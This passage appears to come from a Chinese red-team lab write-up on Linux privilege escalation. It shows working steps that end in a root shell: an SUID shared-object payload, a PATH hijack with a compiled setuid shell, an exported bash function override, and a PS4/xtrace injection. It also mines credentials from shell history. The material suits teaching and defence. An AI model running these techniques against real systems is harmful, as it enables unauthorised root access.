+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setuid</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/bash -p&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>static void injetc() <strong>attribute</strong>((constructor));：声明一个名为 inject 的静态函数，并使用 gcc 的 <strong>attribute</strong>((constructor)) 属性。这个属性使得在程序或动态库加载时自动执行 inject 函数，而不需要显式调用它。</li>
+</ul>
+<h3 id="suid-环境变量提权">SUID 环境变量提权</h3>
+<p>查看具有 s 位的可执行文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/usr/bin/sudoedit
+</span></span><span style="display:flex;"><span>/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/usr/local/bin/suid-so
+</span></span><span style="display:flex;"><span>/usr/local/bin/suid-env
+</span></span><span style="display:flex;"><span>/usr/local/bin/suid-env2
+</span></span><span style="display:flex;"><span>/usr/sbin/exim-4.84-3
+</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device
+</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>/usr/lib/pt_chown
+</span></span><span style="display:flex;"><span>/bin/ping6
+</span></span><span style="display:flex;"><span>/bin/ping
+</span></span><span style="display:flex;"><span>/bin/mount
+</span></span><span style="display:flex;"><span>/bin/su
+</span></span><span style="display:flex;"><span>/bin/umount
+</span></span><span style="display:flex;"><span>/tmp/rootBash2
+</span></span><span style="display:flex;"><span>/sbin/mount.nfs
+</span></span><span style="display:flex;"><span>/home/user/overwrite.sh
+</span></span><span style="display:flex;"><span>/home/user/shell.elf
+</span></span></code></pre></div><p><code>/usr/local/bin/suid-env</code> 可能可以利用提权，查看详细信息。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ file /usr/local/bin/suid-env
+</span></span><span style="display:flex;"><span>/usr/local/bin/suid-env: setuid setgid ELF 64-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked <span style="color:#f92672">(</span>uses shared libs<span style="color:#f92672">)</span>, <span style="color:#66d9ef">for</span> GNU/Linux 2.6.18, not stripped
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ /usr/local/bin/suid-env
+</span></span><span style="display:flex;"><span>Starting web server: apache2httpd <span style="color:#f92672">(</span>pid 1603<span style="color:#f92672">)</span> already running
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ strings /usr/local/bin/suid-env
+</span></span><span style="display:flex;"><span>/lib64/ld-linux-x86-64.so.2
+</span></span><span style="display:flex;"><span>5q;Xq
+</span></span><span style="display:flex;"><span>__gmon_start__
+</span></span><span style="display:flex;"><span>libc.so.6
+</span></span><span style="display:flex;"><span>setresgid
+</span></span><span style="display:flex;"><span>setresuid
+</span></span><span style="display:flex;"><span>system
+</span></span><span style="display:flex;"><span>__libc_start_main
+</span></span><span style="display:flex;"><span>GLIBC_2.2.5
+</span></span><span style="display:flex;"><span>fff.
+</span></span><span style="display:flex;"><span>fffff.
+</span></span><span style="display:flex;"><span>l$ L
+</span></span><span style="display:flex;"><span>t<span style="color:#66d9ef">$(</span>L
+</span></span><span style="display:flex;"><span>|$0H
+</span></span><span style="display:flex;"><span>service apache2 start
+</span></span></code></pre></div><p>发现程序使用 <code>service</code> 启动 <code>apache2</code> 服务，使用的是相对路径而非绝对路径，在本地创建一个 <code>service</code>，让程序执行我们的 <code>service</code> 达成提权。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ vim service.c 
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ cat service.c 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;stdio.h&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;stdlib.h&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>void main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>        setgid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>        system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/bash -p&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ gcc -o service service.c 
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ export PATH<span style="color:#f92672">=</span>.:$PATH
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ echo $PATH
+</span></span><span style="display:flex;"><span>.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ /usr/local/bin/suid-env
+</span></span><span style="display:flex;"><span>root@RedteamNotes:~# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h3 id="巧用-suid-shell-功能提权">巧用 SUID-shell 功能提权</h3>
+<p>查看具有 s 位的可执行文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/usr/bin/sudoedit
+</span></span><span style="display:flex;"><span>/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/usr/local/bin/suid-so
+</span></span><span style="display:flex;"><span>/usr/local/bin/suid-env
+</span></span><span style="display:flex;"><span>/usr/local/bin/suid-env2
+</span></span><span style="display:flex;"><span>/usr/sbin/exim-4.84-3
+</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device
+</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>/usr/lib/pt_chown
+</span></span><span style="display:flex;"><span>/bin/ping6
+</span></span><span style="display:flex;"><span>/bin/ping
+</span></span><span style="display:flex;"><span>/bin/mount
+</span></span><span style="display:flex;"><span>/bin/su
+</span></span><span style="display:flex;"><span>/bin/umount
+</span></span><span style="display:flex;"><span>/tmp/rootBash2
+</span></span><span style="display:flex;"><span>/sbin/mount.nfs
+</span></span><span style="display:flex;"><span>/home/user/overwrite.sh
+</span></span><span style="display:flex;"><span>/home/user/shell.elf
+</span></span></code></pre></div><p>发现 <code>/usr/local/bin/suid-env2</code> 可能可以作为提权的路径，运行查看详细信息。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ /usr/local/bin/suid-env2
+</span></span><span style="display:flex;"><span>Starting web server: apache2httpd <span style="color:#f92672">(</span>pid 1603<span style="color:#f92672">)</span> already running
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ strings /usr/local/bin/suid-env2
+</span></span><span style="display:flex;"><span>/lib64/ld-linux-x86-64.so.2
+</span></span><span style="display:flex;"><span>__gmon_start__
+</span></span><span style="display:flex;"><span>libc.so.6
+</span></span><span style="display:flex;"><span>setresgid
+</span></span><span style="display:flex;"><span>setresuid
+</span></span><span style="display:flex;"><span>system
+</span></span><span style="display:flex;"><span>__libc_start_main
+</span></span><span style="display:flex;"><span>GLIBC_2.2.5
+</span></span><span style="display:flex;"><span>fff.
+</span></span><span style="display:flex;"><span>fffff.
+</span></span><span style="display:flex;"><span>l$ L
+</span></span><span style="display:flex;"><span>t<span style="color:#66d9ef">$(</span>L
+</span></span><span style="display:flex;"><span>|$0H
+</span></span><span style="display:flex;"><span>/usr/sbin/service apache2 start
+</span></span></code></pre></div><p>程序使用 <code>/usr/sbin/service</code> 启动 <code>apache2</code> 服务，查看 <code>bash</code> 版本。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ /bin/bash --version
+</span></span><span style="display:flex;"><span>GNU bash, version 4.1.5<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>-release <span style="color:#f92672">(</span>x86_64-pc-linux-gnu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Free Software Foundation, Inc.
+</span></span><span style="display:flex;"><span>License GPLv3+: GNU GPL version <span style="color:#ae81ff">3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>This is free software; you are free to change and redistribute it.
+</span></span><span style="display:flex;"><span>There is NO WARRANTY, to the extent permitted by law.
+</span></span></code></pre></div><p><code>bash</code> 的版本为 4.1.5，当 <code>bash</code>的版本小于 4.2-048 时，在 <code>Bash shell</code> 中定义并导出一个名为 <code>/usr/sbin/service</code> 的函数。这个函数的定义为运行一个新的 <code>Bash shell</code> 进程，并在该进程中启用特权模式，然后这个函数通过 <code>export -f</code> 命令导出，这使得它可以在当前 <code>Bash shell</code> 会话的子进程中被访问执行。</p>
+<ul>
+<li><code>export -f</code> 将整个函数导入而非一个变量</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ <span style="color:#66d9ef">function</span> /usr/sbin/service <span style="color:#f92672">{</span> /bin/bash -p; <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ export -f /usr/sbin/service 
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ /usr/local/bin/suid-env2
+</span></span><span style="display:flex;"><span>root@RedteamNotes:~# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h3 id="巧用-suid-shell-功能提权-2">巧用 SUID-shell 功能提权 2</h3>
+<p>查看具有 s 位的可执行文件与 <code>bash</code> 版本。<code>bash</code> 版本小于 4。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/usr/bin/sudoedit
+</span></span><span style="display:flex;"><span>/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/usr/local/bin/suid-so
+</span></span><span style="display:flex;"><span>/usr/local/bin/suid-env
+</span></span><span style="display:flex;"><span>/usr/local/bin/suid-env2
+</span></span><span style="display:flex;"><span>/usr/sbin/exim-4.84-3
+</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device
+</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>/usr/lib/pt_chown
+</span></span><span style="display:flex;"><span>/bin/ping6
+</span></span><span style="display:flex;"><span>/bin/ping
+</span></span><span style="display:flex;"><span>/bin/mount
+</span></span><span style="display:flex;"><span>/bin/su
+</span></span><span style="display:flex;"><span>/bin/umount
+</span></span><span style="display:flex;"><span>/tmp/rootBash2
+</span></span><span style="display:flex;"><span>/sbin/mount.nfs
+</span></span><span style="display:flex;"><span>/home/user/overwrite.sh
+</span></span><span style="display:flex;"><span>/home/user/shell.elf
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ /bin/bash --version
+</span></span><span style="display:flex;"><span>GNU bash, version 4.1.5<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>-release <span style="color:#f92672">(</span>x86_64-pc-linux-gnu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Free Software Foundation, Inc.
+</span></span><span style="display:flex;"><span>License GPLv3+: GNU GPL version <span style="color:#ae81ff">3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>This is free software; you are free to change and redistribute it.
+</span></span><span style="display:flex;"><span>There is NO WARRANTY, to the extent permitted by law.
+</span></span></code></pre></div><p>同样使用 <code>/usr/local/bin/suid-env2</code> 进行提权。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ env -i SHELLOPTS<span style="color:#f92672">=</span>xtrace PS4<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$(cp /bin/bash /tmp/rootbash2;chmod +xs /tmp/rootbash2)&#39;</span> /usr/local/bin/suid-env2
+</span></span><span style="display:flex;"><span>/usr/sbin/service apache2 start
+</span></span><span style="display:flex;"><span>basename /usr/sbin/service
+</span></span><span style="display:flex;"><span>VERSION<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;service ver. 0.91-ubuntu1&#39;</span>
+</span></span><span style="display:flex;"><span>basename /usr/sbin/service
+</span></span><span style="display:flex;"><span>USAGE<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Usage: service &lt; option &gt; | --status-all | [ service_name [ command | --full-restart ] ]&#39;</span>
+</span></span><span style="display:flex;"><span>SERVICE<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>ACTION<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>SERVICEDIR<span style="color:#f92672">=</span>/etc/init.d
+</span></span><span style="display:flex;"><span>OPTIONS<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> <span style="color:#ae81ff">2</span> -eq <span style="color:#ae81ff">0</span> <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span>cd /
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> <span style="color:#ae81ff">2</span> -gt <span style="color:#ae81ff">0</span> <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>1<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> in
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> -z <span style="color:#e6db74">&#39;&#39;</span> -a <span style="color:#ae81ff">2</span> -eq <span style="color:#ae81ff">1</span> -a apache2 <span style="color:#f92672">=</span> --status-all <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> <span style="color:#ae81ff">2</span> -eq <span style="color:#ae81ff">2</span> -a start <span style="color:#f92672">=</span> --full-restart <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> -z <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span>SERVICE<span style="color:#f92672">=</span>apache2
+</span></span><span style="display:flex;"><span>shift
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> <span style="color:#ae81ff">1</span> -gt <span style="color:#ae81ff">0</span> <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>1<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> in
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> -z apache2 -a <span style="color:#ae81ff">1</span> -eq <span style="color:#ae81ff">1</span> -a start <span style="color:#f92672">=</span> --status-all <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> <span style="color:#ae81ff">1</span> -eq <span style="color:#ae81ff">2</span> -a <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">=</span> --full-restart <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> -z apache2 <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> -z <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span>ACTION<span style="color:#f92672">=</span>start
+</span></span><span style="display:flex;"><span>shift
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> <span style="color:#ae81ff">0</span> -gt <span style="color:#ae81ff">0</span> <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> -r /etc/init/apache2.conf <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> -x /etc/init.d/apache2 <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span>exec env -i LANG<span style="color:#f92672">=</span> PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM<span style="color:#f92672">=</span>dumb /etc/init.d/apache2 start
+</span></span><span style="display:flex;"><span>Starting web server: apache2httpd <span style="color:#f92672">(</span>pid 1603<span style="color:#f92672">)</span> already running
+</span></span><span style="display:flex;"><span>.
+</span></span></code></pre></div><p>解释一下这个命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>env -i SHELLOPTS<span style="color:#f92672">=</span>xtrace PS4<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$(cp /bin/bash /tmp/rootbash2;chmod +xs /tmp/rootbash2)&#39;</span> /usr/local/bin/suid-env2
+</span></span></code></pre></div><ul>
+<li>-i 参数表示 ignore environment，即忽略现有的环境变量</li>
+<li>xtrace 选项被设置，这将导致 shell 执行每个命令之前都打印该命令在做什么</li>
+<li>PS4 环境变量定义了打印输出的格式为一个命令序列，该序列先复制 /bin/bash 到 /tmp/rootbash2，然后设置 SUID 和可执行状态，在这个特定的命令序列中，xtrace 选项被用于触发 PS4 环境变量中的命令</li>
+<li>SHELLOPTS 是一个只读的 Bash 环境变量，用于列出当前已启用的 shell 选项。这个环境变量的值是一个以冒号分隔的列表，其中包含了当前已启用的 shell 选项的名字。例如启用了 strace 和 ignoreeof 选项则为 xtrace:ignoreeof。</li>
+<li>PS 代表 Prompt Strings。这是用于定义 shell 提示符的环境变量。例如，PS1 是主提示符，是命令行最常见的提示符，通常用于显示工作目录或用户名称等信息；PS2 是第二提示符，用于在需要额外输入时显示，例如在多行命令或 read 命令中。而 PS4 则是用于定义当 shell 以 xtrace 模式运行时的提示符。默认情况下 PS4 设置为 &lsquo;+&rsquo;，这就是为什么运行带 -x 参数的命令时会有 &lsquo;+&rsquo; 符号，在这个命令中每次 xtrace 在打印命令前会执行我们给出的恶意代码来尝试获得 shell</li>
+</ul>
+<p>可以看到已经复制成功了。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ ls -liah /tmp
+</span></span><span style="display:flex;"><span>total 2.0M
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1158721</span> drwxrwxrwt  <span style="color:#ae81ff">4</span> root root 4.0K Jan <span style="color:#ae81ff">16</span> 04:15 .
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">2</span> drwxr-xr-x <span style="color:#ae81ff">21</span> root root 4.0K Apr <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2023</span> ..
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1158728</span> -rw-r--r--  <span style="color:#ae81ff">1</span> root root 127K Jan <span style="color:#ae81ff">16</span> 04:15 backup.tar.gz
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1158724</span> drwxrwxrwt  <span style="color:#ae81ff">2</span> root root 4.0K Jan <span style="color:#ae81ff">16</span> 03:31 .ICE-unix
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1158725</span> -rwsr-sr-x  <span style="color:#ae81ff">1</span> root root 905K Jan <span style="color:#ae81ff">16</span> 04:05 rootbash2
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1158727</span> -rwsr-sr-x  <span style="color:#ae81ff">1</span> root root 905K Jan <span style="color:#ae81ff">16</span> 04:15 rootBash2
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1158723</span> drwxrwxrwt  <span style="color:#ae81ff">2</span> root root 4.0K Jan <span style="color:#ae81ff">16</span> 03:31 .X11-unix
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ /tmp/rootbash2
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ /tmp/rootbash2 -p
+</span></span><span style="display:flex;"><span>rootbash2-4.1# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h3 id="密码和密钥历史文件提权">密码和密钥历史文件提权</h3>
+<p>查看历史记录有没有明文密码泄露。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ cat ~/.*history | grep <span style="color:#e6db74">&#39;root&#39;</span>
+</span></span><span style="display:flex;"><span>mysql -h somehost.local -uroot -ppassword123
+</span></span><span style="display:flex;"><span>su root
+</span></span></code></pre></div><p>发现密码尝试登入。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ su root
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span>root@RedteamNotes:/home/user# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h3 id="密码和密钥配置文件查看提权">密码和密钥配置文件查看提权</h3>
+<p>查看家目录下的文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ pwd
+</span></span><span style="display:flex;"><span>/home/user
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ ls -liah
+</span></span><span style="display:flex;"><span>total 76K
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155042</span> drwxr-xr-x <span style="color:#ae81ff">5</span> user user 4.0K Jan <span style="color:#ae81ff">16</span> 03:47 .
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155041</span> drwxr-xr-x <span style="color:#ae81ff">3</span> root root 4.0K May <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2017</span> ..
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155075</span> -rwxr-xr-x <span style="color:#ae81ff">1</span> user user  <span style="color:#ae81ff">638</span> Jan <span style="color:#ae81ff">15</span> 10:42 39535.sh
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155046</span> -rw------- <span style="color:#ae81ff">1</span> user user 2.4K Jan <span style="color:#ae81ff">16</span> 04:16 .bash_history
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155045</span> -rw-r--r-- <span style="color:#ae81ff">1</span> user user  <span style="color:#ae81ff">220</span> May <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2017</span> .bash_logout
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155043</span> -rw-r--r-- <span style="color:#ae81ff">1</span> user user 3.2K May <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2017</span> .bashrc
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155071</span> -rw-r--r-- <span style="color:#ae81ff">1</span> user user    <span style="color:#ae81ff">0</span> Jan <span style="color:#ae81ff">15</span> 10:22 --checkpoint<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155074</span> -rw-r--r-- <span style="color:#ae81ff">1</span> user user    <span style="color:#ae81ff">0</span> Jan <span style="color:#ae81ff">15</span> 10:23 --checkpoint-action<span style="color:#f92672">=</span>exec<span style="color:#f92672">=</span>shell.elf
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155076</span> drwxr-xr-x <span style="color:#ae81ff">2</span> user user 4.0K Jan <span style="color:#ae81ff">15</span> 11:03 .config
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">375363</span> drwxr-xr-x <span style="color:#ae81ff">2</span> user user 4.0K May <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2017</span> .irssi
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">156485</span> -rw------- <span style="color:#ae81ff">1</span> user user  <span style="color:#ae81ff">137</span> May <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2017</span> .lesshst
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155047</span> -rw-r--r-- <span style="color:#ae81ff">1</span> user user  <span style="color:#ae81ff">212</span> May <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2017</span> myvpn.ovpn
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155048</span> -rw------- <span style="color:#ae81ff">1</span> user user   <span style="color:#ae81ff">11</span> May <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2017</span> .nano_history
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155072</span> -rwsr-sr-x <span style="color:#ae81ff">1</span> user user   <span style="color:#ae81ff">66</span> Jan <span style="color:#ae81ff">15</span> 10:04 overwrite.sh
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155044</span> -rw-r--r-- <span style="color:#ae81ff">1</span> user user  <span style="color:#ae81ff">725</span> May <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2017</span> .profile
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155077</span> -rwxr-xr-x <span style="color:#ae81ff">1</span> user user 6.7K Jan <span style="color:#ae81ff">16</span> 03:47 service
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155082</span> -rw-r--r-- <span style="color:#ae81ff">1</span> user user  <span style="color:#ae81ff">105</span> Jan <span style="color:#ae81ff">16</span> 03:47 service.c
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155063</span> -rwsr-sr-x <span style="color:#ae81ff">1</span> user user  <span style="color:#ae81ff">194</span> Jan <span style="color:#ae81ff">15</span> 10:18 shell.elf
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155049</span> drwxr-xr-x <span style="color:#ae81ff">8</span> user user 4.0K May <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2017</span> tools
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155083</span> -rw------- <span style="color:#ae81ff">1</span> user user 4.0K Jan <span style="color:#ae81ff">16</span> 03:47 .viminfo
+</span></span></code></pre></div><p>发现 <code>myvpn.ovpn</code> 很可疑，查看详细情况。</p>
